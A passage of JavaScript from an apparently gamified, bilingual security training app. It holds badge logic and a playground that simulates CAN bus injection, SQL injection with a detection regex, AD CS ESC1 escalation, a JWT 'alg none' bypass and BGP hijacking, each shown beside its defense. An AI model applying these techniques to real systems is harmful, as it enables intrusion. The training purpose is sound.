      const trPct = tc ? Math.round((sc / tc) * 100) : 0;
      const name = (tr.icon ? tr.icon + " " : "") + (tr[L()] || tr.en);
      const bar = barStr(sc, tc);
      const statusIcon = sc === tc ? '<span class="ok">✓</span>' : (sc > 0 ? '<span class="warn">▸</span>' : '<span class="dim">·</span>');
      print('<span class="tbl"><span class="row">' +
        '<span class="id" style="width:210px;display:inline-block;">' + statusIcon + ' ' + esc(name) + '</span>' +
        '<span class="dim">' + bar + ' ' + String(sc).padStart(2, " ") + '/' + tc + ' (' + String(trPct).padStart(3, " ") + '%)</span>' +
        '</span></span>');
    });

    blank();
    print('<span class="bold">' + (L()==="ko" ? "계층별 침투 상태 (5 Tiers)" : "Progress by Tier (5 Tiers)") + '</span>');
    LAYERS.forEach(lay => {
      const sc = tierSolved(lay.tier), tc = tierChals(lay.tier).length;
      const need = tierNeed(lay.tier);
      const unlocked = isTierUnlocked(lay.tier);
      const breached = sc >= need;
      const bar = barStr(sc, tc);
      const tag = !unlocked ? '🔒' : (breached ? '<span class="ok">✓ ' + esc(S("breached")) + '</span>' : '<span class="warn">▸ ' + sc + '/' + need + '</span>');
      print('<span class="tbl"><span class="row">' +
        '<span class="id" style="width:140px;display:inline-block;">[' + esc(lay.id) + '] T' + lay.tier + '</span>' +
        '<span class="dim">' + bar + ' ' + sc + '/' + tc + '</span>  ' + tag +
        '</span></span>');
    });
  }

  function showTracks(){
    blank();
    print('<span class="bold">' + (L()==="ko" ? ("=== 트랙 목록 (총 " + TRACKS.length + "개 트랙) ===") : ("=== TRACK DIRECTORY (" + TRACKS.length + " tracks) ===")) + '</span>');
    TRACKS.forEach((tr, i) => {
      const chals = CHALLENGES.filter(c => c.track === tr.id);
      const sc = chals.filter(c => state.solved[c.id]).length;
      const tc = chals.length;
      const pct = tc ? Math.round((sc / tc) * 100) : 0;
      const name = (tr.icon ? tr.icon + " " : "") + (tr[L()] || tr.en);
      const mark = sc === tc ? '<span class="ok">✓</span>' : (sc > 0 ? '<span class="warn">▸</span>' : '<span class="dim">·</span>');
      print('<span class="tbl"><span class="row">' +
        '<span class="id" style="width:230px;display:inline-block;">' + mark + ' <b>' + esc(tr.id) + '</b> (' + esc(name) + ')</span>' +
        '<span class="dim">' + sc + '/' + tc + ' (' + pct + '%)</span>' +
        '</span></span>');
    });
    blank();
    print('<span class="dim">' + (L()==="ko" ? "트랙 검색: `search <트랙명>` 또는 계층 내 `ls <트랙명>`" : "Search a track: `search <track>` or `ls <track>` inside a layer") + '</span>');
  }

  function showMap(){
    blank();
    print('<span class="bold">' + esc(S("mapHdr")) + '</span>');
    let lineTop = "", lineMid = "", lineBot = "";
    LAYERS.forEach((lay, i) => {
      const tier = TIERS.find(t => t.id === lay.tier);
      const unlocked = isTierUnlocked(lay.tier);
      const breached = tierSolved(lay.tier) >= tierNeed(lay.tier);
      const icon = !unlocked ? "🔒" : (breached ? "✓" : "▸");
      const cls = !unlocked ? "dim" : (breached ? "ok" : "warn");
      const label = lay.id;
      print('<span class="tbl"><span class="row"><span class="' + cls + '">' +
        (i === 0 ? "" : "&nbsp;&nbsp;│&nbsp;&nbsp;<br>") +
        "[" + icon + "] " + esc(label.toUpperCase()) +
        '</span> <span class="dim">' + esc(lay[L()]) + " · TIER " + lay.tier + '</span></span></span>');
    });
    blank();
    print('<span class="dim">' + (L()==="ko"
      ? "✓ 침투완료 · ▸ 진행중 · 🔒 잠김 — 앞 계층을 뚫어야 다음이 열립니다."
      : "✓ breached · ▸ in progress · 🔒 locked — breach a layer to open the next.") + '</span>');
  }

  /* ===== operator achievements & badges ===== */
  const ACHIEVEMENTS = [
    {
      id: "first_blood",
      icon: "🩸",
      title: { ko: "첫 침투 (First Blood)", en: "First Blood" },
      desc: { ko: "첫 번째 잠금장치 침투 성공", en: "Breach your very first lock." },
      check: () => solvedCount() >= 1
    },
    {
      id: "layer1_breach",
      icon: "🌐",
      title: { ko: "웹 인필트레이터 (Web Infiltrator)", en: "Web Infiltrator" },
      desc: { ko: "계층 1 (웹 서버) 진입 자격 획득", en: "Unlock Layer 1 (Web Server)." },
      check: () => isTierUnlocked(1)
    },
    {
      id: "century",
      icon: "💯",
      title: { ko: "센추리 해커 (Century Hacker)", en: "Century Hacker" },
      desc: { ko: "총 100개 이상의 잠금장치 침투", en: "Breach 100 or more locks." },
      check: () => solvedCount() >= 100
    },
    {
      id: "half_thousand",
      icon: "🛡️",
      title: { ko: "사이버 센티넬 (Cyber Sentinel)", en: "Cyber Sentinel" },
      desc: { ko: "총 500개 이상의 잠금장치 침투", en: "Breach 500 or more locks." },
      check: () => solvedCount() >= 500
    },
    {
      id: "kilohacker",
      icon: "⚡",
      title: { ko: "킬로 오퍼레이터 (Kilo Operator)", en: "Kilo Operator" },
      desc: { ko: "총 1,000개 이상의 잠금장치 침투", en: "Breach 1,000 or more locks." },
      check: () => solvedCount() >= 1000
    },
    {
      id: "pure_operator",
      icon: "🎯",
      title: { ko: "순수 침투가 (Pure Operator)", en: "Pure Operator" },
      desc: { ko: "힌트를 전혀 쓰지 않고 50문제 이상 해결", en: "Solve 50+ locks without using hints." },
      check: () => Object.keys(state.solved).filter(id => !state.hints[id]).length >= 50
    },
    {
      id: "ai_agent_sentinel",
      icon: "🤖",
      title: { ko: "AI Agent Sentinel", en: "AI Agent Sentinel" },
      desc: { ko: "AI Agent & MCP 보안 트랙(aiagent) 전 문제 침투", en: "Breach all 35 challenges in the aiagent track." },
      check: () => {
        const aiChals = CHALLENGES.filter(c => c.track === "aiagent");
        return aiChals.length > 0 && aiChals.every(c => !!state.solved[c.id]);
      }
    },
    {
      id: "vault_breaker",
      icon: "🔐",
      title: { ko: "볼트 브레이커 (Vault Breaker)", en: "Vault Breaker" },
      desc: { ko: "계층 3 (금고 / Vault) 개방", en: "Unlock Layer 3 (The Vault)." },
      check: () => isTierUnlocked(3)
    },
    {
      id: "crown_jewels",
      icon: "💎",
      title: { ko: "크라운 주얼 (Crown Jewels)", en: "Crown Jewels" },
      desc: { ko: "최고 계층인 코어 (Core) 침투 개방", en: "Unlock Layer 4 (Core / Crown Jewels)." },
      check: () => isTierUnlocked(4)
    },
    {
      id: "grandmaster",
      icon: "👑",
      title: { ko: "바이브 레전드 (Vibe Legend)", en: "Vibe Legend" },
      desc: { ko: "레전드 최고 등급 달성 (85% 이상 침투)", en: "Reach the Legend rank (85%+ breaches)." },
      check: () => {
        const legRank = RANKS.find(r => r.en === "Legend");
        return legRank && solvedCount() >= rankMin(legRank);
      }
    }
  ];

  function showToast(icon, title, desc){
    const container = document.getElementById("toastContainer");
    if (!container) return;
    const toast = document.createElement("div");
    toast.className = "toast";
    toast.innerHTML =
      '<span class="toast-icon">' + esc(icon) + '</span>' +
      '<div class="toast-body">' +
        '<div class="toast-title">' + esc(title) + '</div>' +
        '<div class="toast-desc">' + esc(desc) + '</div>' +
      '</div>';
    container.appendChild(toast);
    setTimeout(() => {
      toast.classList.add("toast-leave");
      setTimeout(() => { if (toast.parentNode) toast.parentNode.removeChild(toast); }, 300);
    }, 4500);
  }

  function checkAchievements(silent){
    if (!state.badges || typeof state.badges !== "object") state.badges = {};
    let newlyUnlocked = 0;
    ACHIEVEMENTS.forEach(ach => {
      if (!state.badges[ach.id] && ach.check()){
        state.badges[ach.id] = { ts: Date.now() };
        newlyUnlocked++;
        if (!silent){
          const title = ach.title[L()] || ach.title.ko;
          const desc = ach.desc[L()] || ach.desc.ko;
          showToast(ach.icon, (L()==="ko" ? "업적 달성: " : "Achievement: ") + title, desc);
          print('<span class="bold ok">🏆 [' + esc(S("badgeUnlocked")) + '] ' + ach.icon + ' ' + esc(title) + '</span>');
          sGrant();
        }
      }
    });
    if (newlyUnlocked > 0) save();
  }

  function showBadgesTerminal(){
    blank();
    print('<span class="bold ok">' + esc(S("badgesHdr")) + '</span>');
    const earnedCount = ACHIEVEMENTS.filter(a => !!(state.badges && state.badges[a.id])).length;
    print('<span class="dim">' + (L()==="ko" ? ("달성한 업적: " + earnedCount + " / " + ACHIEVEMENTS.length) : ("Earned Badges: " + earnedCount + " / " + ACHIEVEMENTS.length)) + '</span>');
    blank();
    ACHIEVEMENTS.forEach(ach => {
      const isEarned = !!(state.badges && state.badges[ach.id]);
      const mark = isEarned ? '<span class="ok">[✓]</span>' : '<span class="dim">[🔒]</span>';
      const icon = ach.icon;
      const title = ach.title[L()] || ach.title.ko;
      const desc = ach.desc[L()] || ach.desc.ko;
      const titleFmt = isEarned ? '<span class="bold ok">' + esc(title) + '</span>' : '<span class="dim">' + esc(title) + '</span>';
      print('<span class="tbl"><span class="row">' +
        mark + ' ' + icon + ' ' + titleFmt + ' — <span class="dim">' + esc(desc) + '</span>' +
        '</span></span>');
    });
    blank();
    print('<span class="dim">' + (L()==="ko" ? "상단 🏆 버튼을 누르면 업적 대시보드 팝업이 열립니다." : "Click the 🏆 button in HUD to open the badges modal.") + '</span>');
    blank();
  }

  function showBadgesModal(){
    const modal = document.getElementById("badgeModal");
    const body = document.getElementById("modalBody");
    if (!modal || !body) return;
    const earnedCount = ACHIEVEMENTS.filter(a => !!(state.badges && state.badges[a.id])).length;
    const titleEl = document.getElementById("modalTitle");
    if (titleEl){
      titleEl.textContent = "🏆 " + (L()==="ko" ? "요원 업적 대시보드" : "OPERATOR ACHIEVEMENTS") + " (" + earnedCount + "/" + ACHIEVEMENTS.length + ")";
    }
    body.innerHTML = "";
    ACHIEVEMENTS.forEach(ach => {
      const isEarned = !!(state.badges && state.badges[ach.id]);
      const title = ach.title[L()] || ach.title.ko;
      const desc = ach.desc[L()] || ach.desc.ko;
      const card = document.createElement("div");
      card.className = "badge-card " + (isEarned ? "unlocked" : "locked");
      card.innerHTML =
        '<div class="badge-card-icon">' + ach.icon + '</div>' +
        '<div class="badge-card-info">' +
          '<div class="badge-card-title">' + esc(title) + '</div>' +
          '<div class="badge-card-desc">' + esc(desc) + '</div>' +
          '<div class="badge-card-status">' +
            (isEarned ? '✓ ' + (L()==="ko" ? "달성 완료" : "UNLOCKED") : '🔒 ' + (L()==="ko" ? "잠김" : "LOCKED")) +
          '</div>' +
        '</div>';
      body.appendChild(card);
    });
    modal.style.display = "flex";
  }

  function hideBadgesModal(){
    const modal = document.getElementById("badgeModal");
    if (modal) modal.style.display = "none";
    input.focus();
  }

  /* ===== interactive vulnerability playground ===== */
  let canInterval = null;
  let canSpeed = 48;
  let canRpm = 1850;
  let canInjected = false;
  let canStatus = "BROADCAST: NORMAL";

  function openPlayground(requestedTab){
    const modal = document.getElementById("playgroundModal");
    if (!modal) return;
    modal.style.display = "flex";
    if (requestedTab) switchPlaygroundTab(requestedTab);
    else switchPlaygroundTab("canbus");
    startCanSimulation();
    renderSqli();
    renderAdcs("esc1");
    initJwt();
    renderBgp("normal");
    initOAuth();
    initDbShield();
    initEdr();
    initCrypto();
    initDfir();
    renderSbom("dep_confusion");
    renderServerless("event_inject");
    renderCloudIR("cloudtrail_audit");
  }

  function hidePlayground(){
    const modal = document.getElementById("playgroundModal");
    if (modal) modal.style.display = "none";
    stopCanSimulation();
    input.focus();
  }

  function switchPlaygroundTab(tabName){
    const validTabs = ["canbus", "sqli", "adcs", "jwt", "bgp", "oauth", "dbshield", "edr", "crypto", "dfir", "sbom", "serverless", "cloudir", "extsec"];
    if (!validTabs.includes(tabName)) tabName = "canbus";
    document.querySelectorAll(".pg-tab").forEach(tab => {
      tab.classList.toggle("active", tab.getAttribute("data-tab") === tabName);
    });
    document.querySelectorAll(".pg-panel").forEach(panel => {
      panel.classList.toggle("active", panel.id === "pgPanel-" + tabName);
    });
    if (tabName === "canbus") startCanSimulation();
    else stopCanSimulation();
  }

  // --- 1. CAN Bus Simulator ---
  function startCanSimulation(){
    if (canInterval) return;
    canInterval = setInterval(() => {
      if (!canInjected) {
        canSpeed = Math.max(30, Math.min(90, canSpeed + (Math.floor(Math.random() * 5) - 2)));
        canRpm = Math.max(1200, Math.min(3200, canRpm + (Math.floor(Math.random() * 60) - 30)));
        canStatus = "BROADCAST: NORMAL";
      } else {
        if (Math.random() < 0.25) {
          canInjected = false;
          canStatus = "BROADCAST: RESUMED NORMAL";
        }
      }
      updateCanGauges();
      const speedHex = canSpeed.toString(16).padStart(2, "0").toUpperCase();
      const rpmHex1 = (canRpm >> 8).toString(16).padStart(2, "0").toUpperCase();
      const rpmHex2 = (canRpm & 0xFF).toString(16).padStart(2, "0").toUpperCase();
      const payload = "00 " + speedHex + " " + rpmHex1 + " " + rpmHex2 + " 00 00 00 00";
      appendCanLog("0x244", 8, payload, canInjected);
    }, 800);
  }

  function stopCanSimulation(){
    if (canInterval){ clearInterval(canInterval); canInterval = null; }
  }

  function updateCanGauges(){
    const speedEl = document.getElementById("canSpeedVal");
    const speedBar = document.getElementById("canSpeedBar");
    const rpmEl = document.getElementById("canRpmVal");
    const rpmBar = document.getElementById("canRpmBar");
    const statusEl = document.getElementById("canStatusText");
    if (speedEl) speedEl.textContent = canSpeed + " km/h";
    if (speedBar) speedBar.style.width = Math.min(100, Math.round((canSpeed / 240) * 100)) + "%";
    if (rpmEl) rpmEl.textContent = canRpm + " RPM";
    if (rpmBar) rpmBar.style.width = Math.min(100, Math.round((canRpm / 7000) * 100)) + "%";
    if (statusEl){
      statusEl.textContent = canStatus;
      statusEl.style.color = canInjected ? "var(--red)" : "var(--green)";
    }
  }

  function appendCanLog(id, dlc, data, isInjected){
    const logEl = document.getElementById("canLog");
    if (!logEl) return;
    const timeStr = new Date().toTimeString().split(" ")[0] + "." + Math.floor(Math.random()*900 + 100);
    const item = document.createElement("div");
    item.className = "frame-item" + (isInjected ? " frame-injected" : "");
    item.innerHTML = '<span>[' + esc(timeStr) + '] ID:' + esc(id) + ' (DLC:' + esc(dlc) + ') DATA:' + esc(data) + '</span>' +
                     '<span>' + (isInjected ? '⚡ INJECTED' : 'RX') + '</span>';
    logEl.appendChild(item);
    while (logEl.children.length > 35) logEl.removeChild(logEl.firstChild);
    logEl.scrollTop = logEl.scrollHeight;
  }

  function injectCanFrame(id, dlc, dataHex){
    id = (id || "").trim();
    dataHex = (dataHex || "").trim();
    canInjected = true;
    if (id.toLowerCase() === "0x244" || id === "244"){
      const bytes = dataHex.split(/\s+/);
      const spd = parseInt(bytes[1] || "0", 16);
      if (!isNaN(spd) && spd > 0) canSpeed = spd;
      if (spd >= 200){
        canRpm = 6400;
        canStatus = "🚨 OVERRIDE: SPEED SPOOFED (" + canSpeed + " km/h)";
      } else {
        canRpm = Math.min(6000, canSpeed * 35);
        canStatus = "⚠️ OVERRIDE: CRUISE LOCKED (" + canSpeed + " km/h)";
      }
    } else if (id.toLowerCase() === "0x7df" || id === "7df"){
      canStatus = "⚡ UDS DIAGNOSTIC UNLOCK (Seed/Key Session Granted)";
    } else if (id.toLowerCase() === "0x000" || id === "000" || id === "0"){
      canStatus = "🚨 ARBITRATION BUS FLOOD (Dominant 0-Bits High-Priority DoS)";
    } else {
      canStatus = "⚡ CUSTOM FRAME INJECTED: ID " + id;
    }
    updateCanGauges();
    appendCanLog(id, dlc, dataHex, true);
  }

  // --- 2. SQLi AST Visualizer ---
  function renderSqli(){
    const inputEl = document.getElementById("sqliInput");
    if (!inputEl) return;
    const rawVal = inputEl.value;
    const vulnOut = document.getElementById("sqliVulnOutput");
    const safeOut = document.getElementById("sqliSafeOutput");
    const vulnBadge = document.getElementById("sqliVulnBadge");

    const hasQuote = /['"]/.test(rawVal);
    const hasOr = /\bOR\b/i.test(rawVal);
    const hasUnion = /\bUNION\b/i.test(rawVal);
    const hasComment = /(--|\/\*|#)/.test(rawVal);
    const isTautology = /(1\s*=\s*1|'1'\s*=\s*'1'|true)/i.test(rawVal);

    let vulnStatus = "SAFE";
    let vulnBadgeClass = "token-tag token-lit";
    if (hasQuote && (hasOr || hasUnion || isTautology)){
      vulnStatus = "CRITICAL VULNERABILITY";
      vulnBadgeClass = "token-tag token-inj";
    } else if (hasQuote){
      vulnStatus = "SYNTAX HAZARD / ESCAPED";
      vulnBadgeClass = "token-tag token-op";
    }

    if (vulnBadge){
      vulnBadge.textContent = vulnStatus;
      vulnBadge.className = vulnBadgeClass;
    }

    const reconstructedQuery = "SELECT id, user, role FROM accounts WHERE user = '" + rawVal + "' AND active = 1;";

    let vulnTree = "=== RECONSTRUCTED RAW QUERY ===\n" + reconstructedQuery + "\n\n" +
      "=== PARSED SYNTAX TREE (AST) ===\n" +
      "QueryStatement [SELECT]\n" +
      "├── Target: accounts\n" +
      "├── Columns: [id, user, role]\n" +
      "└── WhereExpression:\n";

    if (hasQuote && hasOr && isTautology){
      vulnTree += "    ├── [LEFT] user = '" + rawVal.split(/['"]/)[0] + "'\n" +
                  "    ├── [OPERATOR HIJACK] BinaryOp: OR  <-- INJECTED\n" +
                  "    ├── [TAUTOLOGY] Literal: 1 = 1 (ALWAYS TRUE) <-- INJECTED\n" +
                  (hasComment ? "    └── [TRUNCATED] Comment ignored remaining clause: AND active = 1\n" : "") +
                  "\n[ANALYSIS] Parser evaluated OR 1=1 as root condition.\n" +
                  "Authentication logic was successfully bypassed!";
    } else if (hasUnion){
      vulnTree += "    ├── [LEFT] user = '" + rawVal.split(/['"]/)[0] + "'\n" +
                  "    └── [HIJACKED UNION] UnionQuery: SELECT ...  <-- INJECTED DATA LEAK\n" +
                  "\n[ANALYSIS] Additional query concatenated to result set.";
    } else {
      vulnTree += "    └── BinaryOp: [user = '" + rawVal + "'] AND [active = 1]\n" +
                  "\n[ANALYSIS] Normal query structure without structural operator injection.";
    }

    if (vulnOut) vulnOut.textContent = vulnTree;

    let safeTree = "=== PARAMETERIZED TEMPLATE ===\n" +
      "SELECT id, user, role FROM accounts WHERE user = ? AND active = 1;\n" +
      "Bound Parameter [0]: " + JSON.stringify(rawVal) + "\n\n" +
      "=== PARSED SYNTAX TREE (AST) ===\n" +
      "QueryStatement [PREPARED]\n" +
      "├── Target: accounts\n" +
      "├── Columns: [id, user, role]\n" +
      "└── WhereExpression [Logical AND]:\n" +
      "    ├── BinaryOp: [user = ? (Literal Text)]\n" +
      "    │   └── Bound Value: " + JSON.stringify(rawVal) + " (Type: String, Len: " + rawVal.length + ")\n" +
      "    └── BinaryOp: [active = 1]\n\n" +
      "[ANALYSIS] Single string literal binding: quotes and SQL keywords are treated strictly as data bytes, never as parser tokens.";

    if (safeOut) safeOut.textContent = safeTree;
  }

  // --- 3. AD CS & Kerberos ASN.1 Inspector ---
  let currentAdcsPreset = "esc1";
  function renderAdcs(preset){
    currentAdcsPreset = preset || "esc1";
    const sanInput = document.getElementById("adcsSanInput");
    const upn = (sanInput && sanInput.value) ? sanInput.value.trim() : "administrator@vibe.corp";
    const certEl = document.getElementById("adcsCertPreview");
    const pacEl = document.getElementById("adcsPacPreview");

    let certText = "";
    let pacText = "";

    if (currentAdcsPreset === "esc1"){
      certText =
        "SEQUENCE (3 elem)  -- Certificate\n" +
        "  SEQUENCE (7 elem)  -- TBSCertificate\n" +
        "    [0] EXPLICIT [Version: v3]\n" +
        "    INTEGER: 0x58291A7C4F2000000001\n" +
        "    SEQUENCE: sha256WithRSAEncryption\n" +
        "    SEQUENCE: CN=vibe-CA, DC=vibe, DC=corp\n" +
        "    SEQUENCE: CN=lowpriv_user, OU=Employees, DC=vibe, DC=corp\n" +
        "    SEQUENCE (3 elem)  -- Extensions\n" +
        "      EXTENSION: szOID_CERTIFICATE_TEMPLATE (ESC1-WebEnroll)\n" +
        "        Flags: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x00000001)\n" +
        "      EXTENSION: szOID_ENHANCED_KEY_USAGE (EKU)\n" +
        "        OID: 1.3.6.1.5.5.7.3.2 (Client Authentication)\n" +
        "        OID: 1.3.6.1.5.2.3.4   (Kerberos PKINIT Authentication)\n" +
        "      EXTENSION: szOID_SUBJECT_ALT_NAME2 (SAN) <-- CRITICAL!\n" +
        "        OtherName (UPN): " + upn + "\n";

      pacText =
        "=== PKINIT AS-REQ / TGT ISSUANCE EVALUATION ===\n" +
        "[+] KDC PKINIT Handler inspected certificate...\n" +
        "[+] SubjectAltName (UPN) matched Active Directory Principal:\n" +
        "    Target Account: " + upn + "\n" +
        "[+] Pre-authentication validated via X.509 private key proof.\n" +
        "[+] KDC generated Kerberos TGT (Ticket Granting Ticket) with PAC:\n\n" +
        "KERBEROS PAC (Privilege Attribute Certificate):\n" +
        "├── PAC_LOGON_INFO:\n" +
        "│   ├── Account SID: S-1-5-21-29481028-109283-500 (Administrator)\n" +
        "│   ├── Primary Group ID: 513 (Domain Users)\n" +
        "│   └── Group Memberships:\n" +
        "│       ├── S-1-5-21-...-512 (Domain Admins) <-- FULL CONTROL\n" +
        "│       ├── S-1-5-21-...-519 (Enterprise Admins)\n" +
        "│       └── S-1-5-32-544     (Builtin Administrators)\n" +
        "└── PAC_SERVER_CHECKSUM: Valid (Signed by krbtgt)\n\n" +
        "VERDICT: 🚨 ESC1 Domain Compromise. TGT for Domain Admin acquired!";
    } else if (currentAdcsPreset === "esc2"){
      certText =
        "SEQUENCE (3 elem)  -- Certificate\n" +
        "  SEQUENCE (7 elem)  -- TBSCertificate\n" +
        "    SEQUENCE: CN=vibe-CA, DC=vibe, DC=corp\n" +
        "    SEQUENCE: CN=lowpriv_user, OU=Employees, DC=vibe, DC=corp\n" +
        "    SEQUENCE (2 elem)  -- Extensions\n" +
        "      EXTENSION: szOID_ENHANCED_KEY_USAGE (EKU)\n" +
        "        OID: 2.5.29.37.0 (Any Purpose / All Application Policies)\n" +
        "      EXTENSION: szOID_SUBJECT_ALT_NAME2 (SAN)\n" +
        "        OtherName (UPN): lowpriv_user@vibe.corp\n";

      pacText =
        "=== ESC2 EVALUATION ===\n" +
        "[!] Template specifies Any Purpose EKU (2.5.29.37.0).\n" +
        "[+] Certificate can be used for Client Auth, Code Signing, or SubCA.\n" +
        "[+] Can enroll for agent certificate and request on behalf of other users.\n\n" +
        "VERDICT: ⚠️ ESC2 High Hazard: Misconfigured EKU enables universal misuse.";
    } else {
      certText =
        "SEQUENCE (3 elem)  -- Certificate\n" +
        "  SEQUENCE (7 elem)  -- TBSCertificate\n" +
        "    SEQUENCE: CN=vibe-CA, DC=vibe, DC=corp\n" +
        "    SEQUENCE: CN=lowpriv_user, OU=Employees, DC=vibe, DC=corp\n" +
        "    SEQUENCE (2 elem)  -- Extensions\n" +
        "      EXTENSION: szOID_CERTIFICATE_TEMPLATE (User)\n" +
        "        Flags: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (0x00000000) [DISABLED]\n" +
        "      EXTENSION: szOID_SUBJECT_ALT_NAME2 (SAN)\n" +
        "        OtherName (UPN): lowpriv_user@vibe.corp [LOCKED TO AD IDENTITY]\n";

      pacText =
        "=== SECURE TEMPLATE EVALUATION ===\n" +
        "[+] Enrollee cannot specify custom SAN.\n" +
        "[+] SAN is automatically populated from requester's AD account.\n" +
        "[+] PAC issued for: S-1-5-21-...-1104 (lowpriv_user)\n\n" +
        "VERDICT: 🛡️ SECURE: Privilege escalation prevented by AD identity binding.";
    }

    if (certEl) certEl.textContent = certText;
    if (pacEl) pacEl.textContent = pacText;
  }

  // --- 4. JWT None Algorithm Tester ---
  function base64UrlEncode(str){
    try {
      return btoa(unescape(encodeURIComponent(str)))
        .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
    } catch(e){
      return btoa(str).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
    }
  }

  function initJwt(){
    const hdrEl = document.getElementById("jwtHeader");
    const payEl = document.getElementById("jwtPayload");
    const sigEl = document.getElementById("jwtSig");
    if (!hdrEl || !payEl || !sigEl) return;
    if (!hdrEl.value){
      hdrEl.value = JSON.stringify({ alg: "RS256", typ: "JWT" }, null, 2);
      payEl.value = JSON.stringify({ sub: "user_4910", role: "guest", exp: Math.floor(Date.now()/1000) + 3600 }, null, 2);
      sigEl.value = "c8f2a1b9d4e5f607182930a4b5c6d7e8";
    }
    updateJwtDisplay();
  }

  function updateJwtDisplay(){
    const hdrEl = document.getElementById("jwtHeader");
    const payEl = document.getElementById("jwtPayload");
    const sigEl = document.getElementById("jwtSig");
    const encodedEl = document.getElementById("jwtEncoded");
    const resEl = document.getElementById("jwtVerificationResult");
    if (!hdrEl || !payEl || !sigEl || !encodedEl || !resEl) return;

    let hObj = {}, pObj = {};
    let hValid = true, pValid = true;
    try { hObj = JSON.parse(hdrEl.value); } catch(e){ hValid = false; }
    try { pObj = JSON.parse(payEl.value); } catch(e){ pValid = false; }

    const hB64 = base64UrlEncode(hdrEl.value);
    const pB64 = base64UrlEncode(payEl.value);
    const sigVal = (sigEl.value || "").trim();
    const tokenStr = hB64 + "." + pB64 + (sigVal ? "." + sigVal : ".");

    encodedEl.textContent = tokenStr;

    const alg = (hObj.alg || "").toLowerCase();
    const role = pObj.role || "unknown";

    let result = "=== JWT VERIFICATION SIMULATION ===\n";
    if (!hValid || !pValid){
      result += "❌ SYNTAX ERROR: Header or Payload is not valid JSON.\n";
    } else if (alg === "none"){
      result += "🚨 CRITICAL: 'alg' header set to 'none'!\n" +
        "1. Naive Verification (No algorithm whitelist):\n" +
        "   jwt.verify(token, secret) -> ACCEPTED (Signature check bypassed!)\n" +
        "   User Authenticated as: " + JSON.stringify(pObj.sub) + ", Role: " + JSON.stringify(role) + "\n" +
        (role === "admin" ? "   ⚡ PRIVILEGE ESCALATION ACHIEVED: Administrative access granted!\n" : "") +
        "2. Secure Verification (Strict whitelist: ['RS256']):\n" +
        "   jwt.verify(token, pubkey, { algorithms: ['RS256'] }) -> 🛡️ REJECTED (Algorithm 'none' disallowed).\n";
    } else {
      result += "🛡️ STANDARD ALGORITHM: " + hObj.alg + "\n" +
        "Signature required. Tampering with payload without valid private key will invalidate signature.\n" +
        "Payload Subject: " + JSON.stringify(pObj.sub) + ", Role: " + JSON.stringify(role) + "\n";
    }
    resEl.textContent = result;
  }

  // --- 5. BGP Route Hijack & RPKI ROV Simulator ---
  let currentBgpScenario = "normal";

  function renderBgp(scenario){
    if (scenario && typeof scenario === "string") {
      currentBgpScenario = scenario;
    }
    const prefixEl = document.getElementById("bgpPrefixInput");
    const originEl = document.getElementById("bgpOriginInput");
    const pathEl = document.getElementById("bgpPathInput");
    const rpkiEl = document.getElementById("bgpRpkiCheck");
    const flowBadge = document.getElementById("bgpFlowBadge");
    const decisionBadge = document.getElementById("bgpDecisionBadge");
    const graphEl = document.getElementById("bgpGraphOutput");
    const ribEl = document.getElementById("bgpRibOutput");

    if (!prefixEl || !originEl || !pathEl || !rpkiEl || !graphEl || !ribEl) return;

    if (scenario === "normal"){
      prefixEl.value = "203.0.113.0/24";
      originEl.value = "200";
      pathEl.value = "300 200";
    } else if (scenario === "exact"){
      prefixEl.value = "203.0.113.0/24";
      originEl.value = "666";
      pathEl.value = "666";
    } else if (scenario === "subprefix"){
      prefixEl.value = "203.0.113.0/25";
      originEl.value = "666";
      pathEl.value = "300 400 666";
    } else if (scenario === "rpki"){
      rpkiEl.checked = !rpkiEl.checked;
    }

    const prefix = prefixEl.value.trim();
    const origin = originEl.value.trim();
    const asPath = pathEl.value.trim();
    const rpkiActive = rpkiEl.checked;

    const isSubprefix = prefix.endsWith("/25");
    const isRogueOrigin = origin === "666";
    const pathHops = asPath.split(/\s+/).filter(Boolean);

    // ROA database:
    // Authorized: Prefix 203.0.113.0/24, MaxLength: 24, Origin: AS200
    let rovState = "VALID";
    let rovReason = "Origin AS matches ROA and prefix length <= MaxLength 24";
    if (isRogueOrigin) {
      rovState = "INVALID";
      rovReason = "Origin AS" + origin + " does not match ROA authorized ASN (AS200)";
    } else if (isSubprefix) {
      rovState = "INVALID";
      rovReason = "Prefix length /25 exceeds ROA MaxLength /24";
    }

    let isHijacked = false;
    let flowStateText = "TRAFFIC: NORMAL (AS200)";
    let flowClass = "token-tag token-lit";

    if (isRogueOrigin || isSubprefix){
      if (rpkiActive && rovState === "INVALID"){
        isHijacked = false;
        flowStateText = "🛡️ PROTECTED: INVALID ROUTE DROPPED";
        flowClass = "token-tag token-lit";
      } else {
        isHijacked = true;
        flowStateText = isSubprefix ? "🚨 100% HIJACKED: LPM (/25 > /24)" : "🚨 HIJACKED: SHORTER AS-PATH (AS666)";
        flowClass = "token-tag token-inj";
      }
    }

    let decisionText = "ROV: " + rovState + (rpkiActive ? " (ENFORCED)" : " (MONITOR ONLY)");
    let decisionClass = rovState === "VALID" ? "token-tag token-lit" : "token-tag token-inj";

    if (flowBadge){
      flowBadge.textContent = flowStateText;
      flowBadge.className = flowClass;
    }
    if (decisionBadge){
      decisionBadge.textContent = decisionText;
      decisionBadge.className = decisionClass;
    }

    // ASCII Graph
    let graphText = "=== GLOBAL AS TOPOLOGY & TRAFFIC FORWARDING ===\n";
    if (isHijacked){
      if (isSubprefix){
        graphText +=
          "  [ AS100 (Client Border Gateway) ]\n" +
          "        │  Dest: 203.0.113.42 (Matches /25 More Specific!)\n" +
          "        ▼\n" +
          "  [ AS300 -> AS400 -> AS666 (ROGUE SINKHOLE) ]  <-- 🚨 100% TRAFFIC HIJACKED!\n\n" +
          "  [ AS200 (Legitimate Host: 203.0.113.0/24) ]   <-- ⚠️ Starved (LPM Overridden)\n\n" +
          "[ANALYSIS] Longest Prefix Match rule dictates forwarding to /25 rather than /24,\n" +
          "regardless of AS-path length (" + pathHops.length + " hops vs 2 hops).";
      } else {
        graphText +=
          "  [ AS100 (Client Border Gateway) ]\n" +
          "        │\n" +
          "        ├── (Path Len: " + pathHops.length + ") ──> [ AS666 (ROGUE AS) ]  <-- 🚨 TRAFFIC DIVERTED!\n" +
          "        │\n" +
          "        └── (Path Len: 2) ──> [ AS300 -> AS200 ] (Ignored: Longer AS-Path)\n\n" +
